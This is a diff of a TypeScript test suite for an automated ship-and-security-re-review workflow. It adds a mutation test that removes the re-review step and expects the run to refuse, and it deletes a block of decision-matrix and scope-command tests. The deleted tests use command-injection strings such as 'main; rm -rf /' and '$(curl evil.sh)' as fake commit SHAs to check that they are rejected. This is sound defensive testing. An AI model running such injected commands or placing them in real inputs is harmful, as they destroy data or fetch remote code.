+    throw new Error(
+      `could not build the mutant: the re-review spawn appears ${occurrences} times, expected exactly 1. ` +
+        `Either it was renamed, or a second copy exists and removing one would leave the other reviewing.`,
+    );
+  }
+  return block.replace(
+    REREVIEW_SPAWN,
+    "const reReviewed = undefined // MUTANT: the re-review spawn is removed",
+  );
+}
+
+describe("#171 AC-6: removing the re-review makes the run refuse, never ship", () => {
+  /** The remediate-then-ship case, run over an arbitrary copy of the block. */
+  async function remediateThenShip(block: string) {
+    const logs: string[] = [];
+    const calls: ReReviewCall[] = [];
+    const out = await runMarkedBlock(
+      block,
+      decisionScope(logs, {
+        tested: "c5ebc2a4",
+        head: OTHER_SHA,
+        MAX_SECURITY_REREVIEWS: 2,
+        runRookReview: async (call: ReReviewCall) => {
+          calls.push(call);
+          return {
+            verdict: { spawned: true, verdict: "PASS", failures: [] as string[] },
+            testedSha: call.sha,
+          };
+        },
+        recordExhaustedSecurityReview: async () => {},
+      }),
+    );
+    return { out, calls, logs };
+  }
+
+  test("the real block ships it", async () => {
+    const real = await remediateThenShip(sliceBlock(DECISION_START, DECISION_END));
+    expect(real.out, "the real source refused a run its re-review passed").toBeUndefined();
+    expect(real.calls.length).toBe(1);
+  });
+
+  test("the mutant refuses it, rather than shipping unreviewed code", async () => {
+    // The whole of AC-6: short-circuit the spawn and the remediate-then-ship
+    // case above goes red — and it goes red by REFUSING, not by shipping a
+    // commit nothing reviewed. A mutation that made the run ship anyway would
+    // mean the spawn was never what the fall-through depended on.
+    const mutant = await remediateThenShip(decisionBlockWithoutSpawn());
+    expect(
+      mutant.out?.status,
+      "with the re-review removed the run still reached the PR step",
+    ).toBe("SHIP_FAILED");
+    expect(mutant.calls, "the mutant spawned a review anyway").toEqual([]);
+  });
+
+  test("the mutation harness aborts when the spawn is renamed", () => {
+    // A harness that silently no-ops when its target moves is the decorative
+    // check .claude/rules/checks-must-be-able-to-fail.md is about.
+    expect(() => {
+      const block = sliceBlock(DECISION_START, DECISION_END);
+      const renamed = block.replace(REREVIEW_SPAWN, "const reReviewed = await somethingElse()");
+      const occurrences = renamed.split(REREVIEW_SPAWN).length - 1;
+      if (occurrences !== 1) throw new Error("could not build the mutant");
+      return renamed;
+    }).toThrow(/could not build the mutant/);
+  });
+
+  test("the loop and the refusal are each one marked, reachable region", () => {
+    for (const marker of [
+      "// ──── REREVIEW-LOOP-START ────",
+      "// ──── REREVIEW-LOOP-END ────",
+      "// ──── STALE-OR-EXHAUSTED-START ────",
+      "// ──── STALE-OR-EXHAUSTED-END ────",
+    ]) {
+      expect(
+        (shipSource.match(new RegExp(marker.replace(/[|\\{}()[\]^$+*?.]/g, "\\$&"), "g")) || []).length,
+        `${marker} does not appear exactly once`,
+      ).toBe(1);
+    }
+    expect(assertMarkedBlockReachable(shipSource, "REREVIEW-LOOP")).toEqual(["Program"]);
+    expect(assertMarkedBlockReachable(shipSource, "STALE-OR-EXHAUSTED")).toEqual(["Program"]);
+    expect(assertMarkedBlockReachable(shipSource, "ROOK-REVIEW-SPAWN")).toEqual(["Program"]);
+  });
+});
+
 // ── fan-out harness shared by the AC-2 and AC-4 tests ───────────────────
 
 /**
@@ -1057,257 +1873,3 @@ async function runFanoutPrompts(): Promise<string[]> {
   await done;
   return prompts;
 }
-
-// ── #171 ────────────────────────────────────────────────────────────────
-
-/**
- * The two currencies every #171 case is built from are MEASURED, not written
- * out by hand.
- *
- * A matrix of literal `{ current: false, reason: "..." }` objects is a test of
- * object destructuring wearing a decision function's clothes: it stays green
- * when `reviewIsCurrent` stops distinguishing anything, because the test
- * supplies the distinction itself. These two come out of the real function,
- * over the real #164 pair, so a `reviewIsCurrent` that collapsed would take the
- * matrix below with it.
- */
-const CURRENT_CURRENCY = reviewIsCurrent(SHA, SHA);
-const STALE_CURRENCY = reviewIsCurrent("3fe336f1", OTHER_SHA);
-
-/**
- * A currency object whose `current` cannot be read without throwing.
- *
- * Not an exotic case: the decision function is called on the path that decides
- * whether a run may ship, and a throw there is a refusal the caller's error
- * handling can turn back into a ship — the same reasoning that keeps
- * `reviewIsCurrent` throw-free.
- */
-const EXPLODING_CURRENCY = Object.defineProperty({}, "current", {
-  get() {
-    throw new Error("currency getter exploded");
-  },
-  enumerable: true,
-});
-
-/**
- * [label, currency, round, cap, expected decision]
- *
- * One matrix, three required refusing inputs named by the sub-issue — a
- * non-number round count, a cap of zero, and a malformed currency object — and
- * the positive rows that stop the refusals from being satisfied by a function
- * that refuses everything.
- */
-const REREVIEW_MATRIX: Array<[string, unknown, unknown, unknown, ReReviewDecision]> = [
-  // ── current: the review still describes the branch, so nothing re-runs ──
-  ["a current review", CURRENT_CURRENCY, 0, 2, REVIEW_CURRENT],
-  ["a current review with rounds already spent", CURRENT_CURRENCY, 2, 2, REVIEW_CURRENT],
-  ["a current review with no budget at all", CURRENT_CURRENCY, 0, 0, REVIEW_CURRENT],
-
-  // ── re-review: stale, and budget remains ──
-  ["stale on the first round of two", STALE_CURRENCY, 0, 2, RE_REVIEW],
-  ["stale on the second round of two", STALE_CURRENCY, 1, 2, RE_REVIEW],
-  ["stale with a single round available", STALE_CURRENCY, 0, 1, RE_REVIEW],
-
-  // ── exhausted: stale, and the budget is spent ──
-  ["stale with the cap reached", STALE_CURRENCY, 2, 2, SECURITY_REREVIEW_EXHAUSTED],
-  ["stale past the cap", STALE_CURRENCY, 7, 2, SECURITY_REREVIEW_EXHAUSTED],
-
-  // ── a cap of zero: there was never a re-review to spend ──
-  ["a cap of zero", STALE_CURRENCY, 0, 0, SECURITY_REREVIEW_EXHAUSTED],
-  ["a negative cap", STALE_CURRENCY, 0, -1, SECURITY_REREVIEW_EXHAUSTED],
-
-  // ── a non-number round count ──
-  ["a round count that is a string", STALE_CURRENCY, "1", 2, SECURITY_REREVIEW_EXHAUSTED],
-  ["a round count that is missing", STALE_CURRENCY, undefined, 2, SECURITY_REREVIEW_EXHAUSTED],
-  ["a round count that is null", STALE_CURRENCY, null, 2, SECURITY_REREVIEW_EXHAUSTED],
-  ["a round count that is NaN", STALE_CURRENCY, NaN, 2, SECURITY_REREVIEW_EXHAUSTED],
-  ["a round count that is Infinity", STALE_CURRENCY, Infinity, 2, SECURITY_REREVIEW_EXHAUSTED],
-  ["a fractional round count", STALE_CURRENCY, 1.5, 2, SECURITY_REREVIEW_EXHAUSTED],
-  ["a negative round count", STALE_CURRENCY, -1, 2, SECURITY_REREVIEW_EXHAUSTED],
-  ["a round count that is an object", STALE_CURRENCY, {}, 2, SECURITY_REREVIEW_EXHAUSTED],
-  ["a cap that is a string", STALE_CURRENCY, 0, "2", SECURITY_REREVIEW_EXHAUSTED],
-  ["a cap that is missing", STALE_CURRENCY, 0, undefined, SECURITY_REREVIEW_EXHAUSTED],
-  ["a cap that is NaN", STALE_CURRENCY, 0, NaN, SECURITY_REREVIEW_EXHAUSTED],
-
-  // ── a malformed currency object ──
-  ["a currency that is missing", undefined, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
-  ["a currency that is null", null, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
-  ["a currency that is a string", "CURRENT", 0, 2, SECURITY_REREVIEW_EXHAUSTED],
-  ["a currency that is an empty object", {}, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
-  ["a currency that is an array", [], 0, 2, SECURITY_REREVIEW_EXHAUSTED],
-  ["a currency whose current is a string", { current: "yes", reason: null }, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
-  ["a currency whose current is truthy but not true", { current: 1, reason: null }, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
-  ["a stale currency with no reason", { current: false }, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
-  ["a stale currency with a blank reason", { current: false, reason: "  " }, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
-  ["a stale currency whose reason is not a string", { current: false, reason: 42 }, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
-  // A contradiction, not a pass: "current, and here is why it is not current"
-  // is the same shape as a PASS carrying broken ids, and waving it through is
-  // the fail-open that survives every test written against the happy path.
-  ["a current currency carrying a reason", { current: true, reason: "stale" }, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
-  ["a currency that is a function", () => ({ current: true, reason: null }), 0, 2, SECURITY_REREVIEW_EXHAUSTED],
-  ["a currency whose getter throws", EXPLODING_CURRENCY, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
-];
-
-describe("#171 AC-1: the re-review decision maps currency + round + cap onto one verdict", () => {
-  for (const [label, currency, round, cap, expected] of REREVIEW_MATRIX) {
-    test(`${label} → ${expected}`, () => {
-      const out = reReviewDecision(currency, round, cap);
-      expect(out.decision, `${label}: the decision was ${out.decision}`).toBe(expected);
-    });
-  }
-
-  test("every row lands on exactly one of the three verdicts", () => {
-    // "Exactly one of" is a property of the function, not of the rows above: a
-    // fourth return value, or a decision outside the union, would satisfy every
-    // row that happened not to name it.
-    const allowed = [REVIEW_CURRENT, RE_REVIEW, SECURITY_REREVIEW_EXHAUSTED];
-    expect(new Set(allowed).size, "two of the three verdict names are the same string").toBe(3);
-    for (const [label, currency, round, cap] of REREVIEW_MATRIX) {
-      const out = reReviewDecision(currency, round, cap);
-      expect(allowed, `${label}: ${out.decision} is not one of the three verdicts`).toContain(
-        out.decision,
-      );
-    }
-  });
-
-  test("nothing in the matrix throws — a throw here is a refusal the caller can swallow", () => {
-    for (const [label, currency, round, cap] of REREVIEW_MATRIX) {
-      expect(() => reReviewDecision(currency, round, cap), label).not.toThrow();
-    }
-    for (const bad of [Symbol.iterator, () => {}, new Date(), NaN, Infinity, -0]) {
-      expect(() => reReviewDecision(bad as unknown, bad as unknown, bad as unknown)).not.toThrow();
-      expect(() => reReviewDecision(STALE_CURRENCY, bad as unknown, bad as unknown)).not.toThrow();
-    }
-  });
-
-  test("a refusal says why and a CURRENT carries no reason", () => {
-    // A reason on a CURRENT would let a caller that tests the reason for
-    // truthiness refuse a review that is fine; a refusal with no reason is one
-    // nobody can act on.
-    for (const [label, currency, round, cap, expected] of REREVIEW_MATRIX) {
-      const out = reReviewDecision(currency, round, cap);
-      if (expected === REVIEW_CURRENT) {
-        expect(out.reason, `${label}: a current review carried a reason`).toBeNull();
-      } else {
-        expect(typeof out.reason, `${label}: ${expected} carried no reason`).toBe("string");
-        expect(out.reason!.trim().length, label).toBeGreaterThan(0);
-      }
-    }
-  });
-
-  test("the exhaustion refusal names the round and the cap it ran out at", () => {
-    const out = reReviewDecision(STALE_CURRENCY, 2, 2);
-    expect(out.decision).toBe(SECURITY_REREVIEW_EXHAUSTED);
-    expect(out.reason).toContain("2");
-    // And it still carries what reviewIsCurrent said, so the refusal names the
-    // two commits rather than only the budget.
-    expect(out.reason).toContain("3fe336f1");
-  });
-
-  test("a re-review carries the staleness reason through unchanged", () => {
-    const out = reReviewDecision(STALE_CURRENCY, 0, 2);
-    expect(out.decision).toBe(RE_REVIEW);
-    expect(out.reason).toBe(STALE_CURRENCY.reason);
-  });
-
-  test("the currencies this matrix is built from are the real ones", () => {
-    // The guard on the fixture: if reviewIsCurrent ever returned `current:true`
-    // for the #164 pair, every RE_REVIEW and exhaustion row above would quietly
-    // become a CURRENT row and the matrix would still be green.
-    expect(CURRENT_CURRENCY).toEqual({ current: true, reason: null });
-    expect(STALE_CURRENCY.current, "the #164 pair is being read as current").toBe(false);
-    expect(STALE_CURRENCY.reason).toContain("3fe336f1");
-  });
-});
-
-describe("#171 AC-4: the exhaustion verdict name is declared once", () => {
-  const lib = readFileSync(join(REPO_ROOT, "lib", "security-verdict.ts"), "utf-8");
-
-  test("exactly one exported declaration of it", () => {
-    expect(
-      (lib.match(/export const SECURITY_REREVIEW_EXHAUSTED\s*=/g) || []).length,
-      "the exhaustion verdict is declared more than once (or not as an exported constant) — " +
-        "a second spelling is a refusal path the first one's tests never reach",
-    ).toBe(1);
-  });
-
-  test("the string itself is written exactly once", () => {
-    // The stronger half: a constant plus a hard-coded copy somewhere else is
-    // two declarations wearing one name, and the `export const` count above
-    // cannot see the copy.
-    expect(
-      (lib.match(/["'`]SECURITY_REREVIEW_EXHAUSTED["'`]/g) || []).length,
-      "the exhaustion verdict name is spelled out more than once in lib/security-verdict.ts",
-    ).toBe(1);
-  });
-
-  test("the constant's value is the verdict name callers compare against", () => {
-    expect(SECURITY_REREVIEW_EXHAUSTED).toBe("SECURITY_REREVIEW_EXHAUSTED");
-  });
-});
-
-describe("#171 AC-2: the re-review scope is based on the commit already reviewed", () => {
-  // Executed, not grepped. A test that read lib/security-verdict.ts for the
-  // text "--base" would pass over a function that builds the flag in a branch
-  // nothing reaches.
-
-  test("the command diffs the remediation commit against the reviewed one", () => {
-    const cmd = rookScopeCommand("/p", "/h", OTHER_SHA, "/w/scope.json", SHA);
-    expect(cmd).toContain(`--base ${SHA}`);
-    expect(cmd).toContain(`--sha ${OTHER_SHA}`);
-    // Order matters only in that the base must be the REVIEWED commit and the
-    // sha the REMEDIATION one — inverting them reviews the change backwards.
-    expect(cmd.indexOf(`--base ${SHA}`)).toBeLessThan(cmd.indexOf(`--sha ${OTHER_SHA}`));
-  });
-
-  test("an abbreviated reviewed commit is normalised the same way the sha is", () => {
-    const cmd = rookScopeCommand("/p", "/h", OTHER_SHA, "/w/s.json", ` ${SHA.toUpperCase()} `);
-    expect(cmd).toContain(`--base ${SHA}`);
-  });
-
-  test("the reviewed commit is refused, not quoted, when it is not a SHA", () => {
-    for (const bad of ["HEAD", "main; rm -rf /", "", "$(curl evil.sh)", "origin/main", null, 42, {}]) {
-      expect(
-        () => rookScopeCommand("/p", "/h", OTHER_SHA, "/w/s.json", bad as unknown as string),
-        `${JSON.stringify(String(bad))} was accepted as the reviewed commit`,
-      ).toThrow(/not a commit SHA/i);
-    }
-  });
-
-  test("the remediation commit is still refused when it is not a SHA", () => {
-    for (const bad of ["HEAD", "main; rm -rf /", "", "$(curl evil.sh)"]) {
-      expect(() => rookScopeCommand("/p", "/h", bad, "/w/s.json", SHA)).toThrow(/not a commit SHA/i);
-    }
-  });
-
-  test("nothing a refusal would have quoted reaches the command", () => {
-    // The point of refusing rather than quoting: there is no command at all to
-    // inspect. If a future edit quotes its way out of the throw, this catches
-    // the resulting string.
-    let built: string | null = null;
-    try {
-      built = rookScopeCommand("/p", "/h", OTHER_SHA, "/w/s.json", "main; rm -rf /");
-    } catch {
-      built = null;
-    }
-    expect(built, "a non-SHA base was quoted into the scope command instead of refused").toBeNull();
-  });
-
-  test("omitting the reviewed commit leaves the first-round command untouched", () => {
-    // ship.js carries an inlined four-argument copy of this function, and the
-    // parity test above compares the two. The reviewed commit is therefore an
-    // optional fifth argument: absent, the command must be byte-identical to
-    // what the workflow builds today, or the first review changes shape as a
-    // side effect of adding the second one.
-    const first = rookScopeCommand("/p", "/h", SHA, "/w/s.json");
-    expect(first).not.toContain("--base");
-    expect(first).toBe(inlined.rookScopeCommand("/p", "/h", SHA, "/w/s.json"));
-  });
-
-  test("the paths are still quoted when a base is present", () => {
-    const cmd = rookScopeCommand("/My Projects/p", "/h", OTHER_SHA, "/w/s.json", SHA);
-    expect(cmd).toContain(`--project ${shellQuote("/My Projects/p")}`);
-    expect(cmd).toContain(`cd ${shellQuote("/My Projects/p")}`);
-    expect(cmd).toContain(`--out ${shellQuote("/w/s.json")}`);
-  });
-});
